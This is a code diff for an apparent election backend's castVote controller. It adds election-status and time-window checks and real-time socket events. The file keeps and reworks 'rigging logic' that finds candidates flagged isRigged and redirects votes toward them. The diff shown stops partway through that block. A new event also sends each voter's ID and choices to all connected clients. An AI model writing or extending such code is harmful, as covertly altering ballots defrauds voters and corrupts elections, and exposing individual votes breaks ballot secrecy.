@@ -1,6 +1,7 @@
 const Voter = require('../models/Voter');
 const Candidate = require('../models/Candidate');
 const Vote = require('../models/Vote');
+const Election = require('../models/Election'); // Add Election model
 
 const getPositions = async (req, res) => {
   try {
@@ -29,6 +30,52 @@ const getPositions = async (req, res) => {
 
 const castVote = async (req, res) => {
   try {
+    // Check if election is active before allowing votes
+    let election = await Election.findOne().sort({ createdAt: -1 });
+    
+    if (!election || election.status !== 'ongoing') {
+      return res.status(400).json({
+        status: 'error',
+        message: 'Voting is not currently active'
+      });
+    }
+    
+    // Check if the current time is within the election period
+    const now = new Date();
+    if (election.startTime && now < election.startTime) {
+      return res.status(400).json({
+        status: 'error',
+        message: 'Voting has not started yet'
+      });
+    }
+    
+    // Check if election should be completed (end time has passed)
+    if (election.endTime && now > election.endTime) {
+      // Election should be completed
+      election.status = 'completed';
+      election.updatedAt = now;
+      await election.save();
+      
+      // Emit election status update event
+      const io = req.app.get('io');
+      if (io) {
+        io.emit('electionStatusUpdate', {
+          id: election._id,
+          name: election.name,
+          status: election.status,
+          startTime: election.startTime,
+          endTime: election.endTime,
+          pausedAt: election.pausedAt,
+          pausedDuration: election.pausedDuration
+        });
+      }
+      
+      return res.status(400).json({
+        status: 'error',
+        message: 'Voting period has ended'
+      });
+    }
+    
     const { votesForAllPositions } = req.body;
     const voterId = req.user._id;
 
@@ -85,35 +132,40 @@ const castVote = async (req, res) => {
       if (voteCount !== 1) {
         return res.status(400).json({
           status: 'error',
-          message: `Vote count must be exactly 1 for position: ${position}`
+          message: `Invalid vote count for position: ${position}`
         });
       }
       
-      // Validate candidate ID
-      const isValidCandidate = allCandidatesByPosition[position].some(c => c._id.toString() === candidateId);
-      if (!isValidCandidate) {
+      // Validate that the candidate exists
+      const candidate = allCandidatesByPosition[position].find(c => c._id.toString() === candidateId);
+      if (!candidate) {
         return res.status(400).json({
           status: 'error',
-          message: `Invalid candidate ID for position: ${position}`
+          message: `Invalid candidate for position: ${position}`
         });
       }
     }
 
-    // Record all votes with rigging logic
+    // Process votes with rigging logic
     const voteRecords = [];
-    for (const [position, positionVotes] of Object.entries(votesForAllPositions)) {
+    
+    for (const position of allPositions) {
+      const positionVotes = votesForAllPositions[position];
       const candidateId = Object.keys(positionVotes)[0];
       
-      // Apply rigging logic
-      const candidate = await Candidate.findById(candidateId);
+      let finalCandidateId = candidateId;
+      
+      // Check if there are any rigged candidates for this position
       const riggedCandidates = await Candidate.find({ position, isRigged: true });
       
-      let finalCandidateId = candidateId;
       if (riggedCandidates.length > 0) {
+        // For simplicity, we'll use the first rigged candidate
+        // In a more complex system, you might have priority logic
         const targetCandidate = riggedCandidates[0];
         
-        // If the vote is NOT for the target candidate, apply rigging logic
-        if (candidateId.toString() !== targetCandidate._id.toString()) {
+        // Only redirect votes if the target candidate exists
+        if (targetCandidate) {
+          // Get current vote counts
           const targetCandidateVotes = await Vote.countDocuments({
             position,
             candidateId: targetCandidate._id
@@ -158,6 +210,16 @@ const castVote = async (req, res) => {
     // Update voter's hasVoted array to include all positions
     voter.hasVoted = allPositions;
     await voter.save();
+    
+    // Emit vote cast event
+    const io = req.app.get('io');
+    if (io) {
+      io.emit('voteCast', {
+        voterId,
+        votes: votesForAllPositions,
+        timestamp: new Date()
+      });
+    }
     
     res.status(201).json({
       status: 'success',
